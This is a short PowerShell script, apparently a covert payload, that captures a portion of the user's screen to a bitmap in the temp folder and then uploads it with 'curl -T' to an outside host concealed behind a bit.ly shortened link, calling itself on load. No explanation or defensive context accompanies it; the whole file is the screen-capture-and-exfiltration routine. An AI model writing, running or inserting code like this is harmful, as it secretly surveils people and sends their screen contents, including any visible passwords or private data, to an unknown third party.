function screenshot()
{
  cmd.exe /c "echo.> %temp%\screen.bmp"
  $File = "$env:TEMP\screen.bmp"
  Add-Type -AssemblyName System.Windows.Forms
  Add-type -AssemblyName System.Drawing
  # Gather Screen resolution information
  $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
  $Width = $Screen.Width - 400
  $Height = $Screen.Height - 300
  $Left = $Screen.Left + 400
  $Top = $Screen.Top + 300
  # Create bitmap using the top-left and bottom-right bounds
  $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
  # Create Graphics object
  $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
  # Capture screen
  $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
  # Save to file
  $bitmap.Save($File)
  Start-Sleep 1
  cmd.exe /c "curl -T %temp%\screen.bmp -Ls https://bit.ly/3yPnegN"
}
screenshot
